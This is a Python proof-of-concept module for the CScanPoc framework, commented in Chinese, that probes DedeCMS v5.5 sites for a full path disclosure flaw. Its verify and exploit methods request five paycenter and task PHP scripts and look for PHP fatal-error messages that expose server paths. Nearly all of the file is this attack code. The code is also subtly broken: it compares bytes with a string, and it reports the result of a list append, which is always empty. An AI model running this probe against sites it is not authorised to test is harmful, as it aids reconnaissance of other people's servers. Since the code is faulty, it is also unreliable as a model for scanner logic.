# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0101'  # 平台漏洞编号，留空
    name = 'DedeCMS v5.5 full Path Disclosure Vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-19'  # 漏洞公布时间
    desc = '''
    DedeCMS v5.5 full Path Disclosure Vulnerability(全路径泄露).
    '''  # 漏洞描述
    ref = 'http://www.myhack58.com/Article/html/3/62/2010/26804.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2c9c5ed8-7ed6-418b-a036-a779c29465ee'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/plus/paycenter/alipay/return_url.php',
                         '/plus/paycenter/cbpayment/autoreceive.php',
                         '/plus/paycenter/nps/config_pay_nps.php',
                         '/plus/task/dede-maketimehtml.php',
                         '/plus/task/dede-optimize-table.php', ]
            file_path = []
            for filename in file_list:
                verify_url = self.target + filename
                try:
                    req = urllib.request.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                if '<b>Fatal error</b>:' in content and '.php</b>' in content:
                    if 'on line <b>' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;'.format(
                            target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/plus/paycenter/alipay/return_url.php',
                         '/plus/paycenter/cbpayment/autoreceive.php',
                         '/plus/paycenter/nps/config_pay_nps.php',
                         '/plus/task/dede-maketimehtml.php',
                         '/plus/task/dede-optimize-table.php', ]
            file_path = []
            for filename in file_list:
                verify_url = self.target + filename
                try:
                    req = urllib.request.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                if '<b>Fatal error</b>:' in content and '.php</b>' in content:
                    if 'on line <b>' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:file_path={file_path}'.format(
                            target=self.target, name=self.vuln.name, file_path=file_path.append(verify_url)))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
